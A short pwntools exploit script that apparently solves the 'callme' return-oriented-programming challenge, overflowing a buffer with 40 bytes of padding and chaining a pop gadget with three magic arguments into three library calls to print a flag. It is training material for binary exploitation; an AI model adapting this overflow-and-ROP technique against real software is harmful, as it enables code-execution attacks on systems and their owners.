#!/usr/bin/env python3

from pwn import *

exe = ELF("callme_patched")
libc = ELF("libcallme.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)
    # parameters = 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d

    offset = 40
    cmeone = 0x400720
    cmetwo = 0x400740
    cmethree = 0x4006f0
    poparam = 0x40093c
    payload = flat(b'A'*offset, poparam, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, cmeone, poparam, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, cmetwo, poparam, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, cmethree)

    r.sendlineafter(b'>', payload)

    r.recvline()
    r.recvline()
    r.recvline()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
